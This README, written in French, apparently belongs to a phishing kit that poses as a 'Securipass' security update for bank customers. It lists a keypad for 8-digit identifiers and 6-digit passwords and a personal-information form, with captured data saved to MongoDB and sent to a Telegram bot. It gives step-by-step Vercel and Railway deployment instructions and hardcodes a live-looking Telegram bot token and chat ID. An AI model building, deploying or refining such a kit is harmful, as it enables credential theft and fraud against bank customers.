# Securipass - Mise à jour sécurité

Site web de mise à jour Securipass pour renforcer la sécurité des comptes clients.

## 🚀 Déploiement sur Vercel

### Option 1: Déploiement Frontend uniquement (Recommandé pour commencer)

Le backend FastAPI nécessite un serveur persistant. Pour une solution complète, vous devrez :
- Déployer le frontend sur Vercel
- Déployer le backend sur Railway, Render ou Heroku

#### Étapes pour déployer le frontend sur Vercel :

1. **Connectez votre repository GitHub à Vercel**
   - Allez sur [vercel.com](https://vercel.com)
   - Cliquez sur "Add New Project"
   - Sélectionnez votre repository `securipass-sg`

2. **Configuration du projet**
   - Framework Preset: `Create React App`
   - Root Directory: `frontend`
   - Build Command: `yarn build`
   - Output Directory: `build`

3. **Variables d'environnement Frontend**
   ```
   REACT_APP_BACKEND_URL=https://votre-backend-url.railway.app
   ```

### Option 2: Déploiement Backend sur Railway (Gratuit)

1. **Créez un compte sur [Railway.app](https://railway.app)**

2. **Créez un nouveau projet**
   - Cliquez sur "New Project"
   - Sélectionnez "Deploy from GitHub repo"
   - Choisissez `securipass-sg`

3. **Configuration**
   - Root Directory: `backend`
   - Start Command: `uvicorn server:app --host 0.0.0.0 --port $PORT`

4. **Variables d'environnement Backend**
   ```
   MONGO_URL=mongodb+srv://votre-url
   DB_NAME=securipass
   TELEGRAM_BOT_TOKEN=8778778095:AAHlmDsvRy7rwntbjjaOdG7TEKezxKKtVV4
   TELEGRAM_CHAT_ID=6624460709
   PORT=8000
   ```

5. **Récupérez l'URL Railway** et mettez-la dans `REACT_APP_BACKEND_URL` sur Vercel

## 📦 Structure du projet

```
/
├── frontend/          # Application React
│   ├── src/
│   │   ├── components/  # Composants réutilisables
│   │   ├── pages/       # Pages de l'application
│   │   ├── context/     # Context API React
│   │   └── mock.js      # Données de démonstration
│   └── package.json
├── backend/           # API FastAPI
│   ├── server.py      # Serveur principal
│   └── requirements.txt
└── vercel.json        # Configuration Vercel
```

## 🔧 Développement local

### Frontend
```bash
cd frontend
yarn install
yarn start
```

### Backend
```bash
cd backend
pip install -r requirements.txt
uvicorn server:app --reload --port 8001
```

## ✨ Fonctionnalités

- ✅ Authentification sécurisée avec clavier numérique
- ✅ Saisie d'identifiant (8 chiffres)
- ✅ Saisie de mot de passe (6 chiffres)
- ✅ Formulaire d'informations personnelles
- ✅ Intégration Telegram pour les notifications
- ✅ Sauvegarde en base de données MongoDB
- ✅ Design responsive et moderne

## 🎨 Technologies utilisées

- **Frontend:** React, TailwindCSS, Shadcn UI
- **Backend:** FastAPI, Python
- **Base de données:** MongoDB
- **Intégration:** Telegram Bot API
- **Déploiement:** Vercel

## 📝 Configuration MongoDB Atlas

1. Créez un compte sur [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Créez un nouveau cluster
3. Créez une base de données
4. Récupérez la chaîne de connexion
5. Ajoutez-la comme variable d'environnement `MONGO_URL`

## 🤖 Configuration du Bot Telegram

1. Créez un bot via [@BotFather](https://t.me/BotFather)
2. Récupérez le token du bot
3. Démarrez une conversation avec votre bot
4. Récupérez votre chat ID via `https://api.telegram.org/bot<TOKEN>/getUpdates`
5. Ajoutez les variables `TELEGRAM_BOT_TOKEN` et `TELEGRAM_CHAT_ID`

## 📄 Licence

Ce projet est à usage privé.
